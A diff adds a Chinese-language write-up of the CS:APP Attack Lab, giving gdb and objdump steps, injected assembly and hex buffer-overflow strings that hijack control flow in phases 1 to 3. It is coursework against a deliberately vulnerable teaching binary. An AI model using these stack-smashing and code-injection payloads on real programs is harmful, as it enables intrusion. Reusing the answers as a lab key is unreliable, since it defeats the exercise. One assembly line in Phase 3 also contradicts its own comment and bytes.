@@ -1,0 +1,63 @@
+这个lab我的wsl2一直报错，所以改用docker
+好在有前辈建好了docker环境
+xieguochao/csapp
+
+Phase1:
+objdump -d ctarget > ctarget_disasm.txt
+看到getbuf中%rsp减去了0x28，所以buf大小为40
+所以我们用40位字符串加上touch1地址0x00000000004017c0即可
+注意是小端法
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+./hex2raw < exploit.txt > exploit-raw.txt
+./ctarget -q -i exploit-raw.txt
+
+Phase2:
+这次要给touch2传入cookie0x59b997fa
+所以跳转到buf起点
+传入参数后再跳转touch2地址0x004017ec
+
+找buf起点需要用到gdb
+gdb -q ctarget
+r -q -i exploit-raw.txt
+b getbuf
+si //减去0x28后才是buf起点
+p $rsp //i r也可
+发现起点是0x5561dc78
+
+所以汇编如下
+movq $0x59b997fa,%rdi
+pushq $0x004017ec
+ret
+用附录方法翻译成二进制得到答案
+48 c7 c7 fa 97 b9 59 68 ec 17
+40 00 c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+
+Phase3:
+这次要传入cookie 59b997fa的ascii码
+movq $0x59b99807,%rdi //这里是放text地址 0x5561dc78 + 0d13 = 0x5561dc85
+pushq $0x004018fa
+ret
+.string "59b997fa"
+
+48 c7 c7 85 dc 61 55 68 fa 18
+40 00 c3 35 39 62 39 39 37 66
+61 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+
+这里我们会发现行不通，发现是因为hexmatch改了buf
+所以这次我们把ascii码放到地址后面
+// 这里text地址 0x5561dc78 + 0d48 = 0x5561dca8
+48 c7 c7 a8 dc 61 55 68 fa 18
+40 00 c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 35 39
+62 39 39 37 66 61 00
